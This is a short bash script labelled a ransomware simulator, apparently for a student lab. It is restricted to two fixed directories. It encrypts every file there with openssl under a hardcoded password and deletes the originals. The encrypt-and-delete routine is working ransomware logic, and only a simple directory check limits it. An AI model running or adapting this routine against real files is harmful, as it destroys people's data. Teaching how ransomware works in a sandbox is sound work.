#!/bin/bash
set -euo pipefail

# =========================
# Simple Ransomware Simulator
# =========================

TARGET_DIR="$1"
NUM_FILES="${2:-}"

# safety check
if [[ -z "$TARGET_DIR" ]]; then
  echo "Usage: $0 <target_directory> [num_files]"
  exit 1
fi

# allow only safe directories
if [[ "$TARGET_DIR" != "/home/student/data" && "$TARGET_DIR" != "/home/student/target" ]]; then
  echo "[!] Refusing to run on unsafe directory: $TARGET_DIR"
  exit 1
fi

# generate files
if [[ -n "$NUM_FILES" ]]; then
  if ! [[ "$NUM_FILES" =~ ^[0-9]+$ ]]; then
    echo "[!] num_files must be an integer"
    exit 1
  fi

  echo "[*] Generating $NUM_FILES files in $TARGET_DIR"
  for i in $(seq 1 "$NUM_FILES"); do
    echo "This is file $i" > "$TARGET_DIR/file_$i.txt"
  done
fi

echo "[*] Starting encryption in $TARGET_DIR"

shopt -s nullglob
for f in "$TARGET_DIR"/*; do
  [[ -f "$f" ]] || continue

  #skip already encrypted files
  [[ "$f" == *.enc ]] && continue

  out="${f}.enc"

  #use pbkdf2 for key-derivation warning
  openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -in "$f" -out "$out" -k "password123"

  # delete original only if encryption succeeded
  if [[ -f "$out" ]]; then
    rm -f "$f"
  else
    echo "[!] Encryption failed for: $f"
    exit 1
  fi
done

echo "[+] Encryption completed"
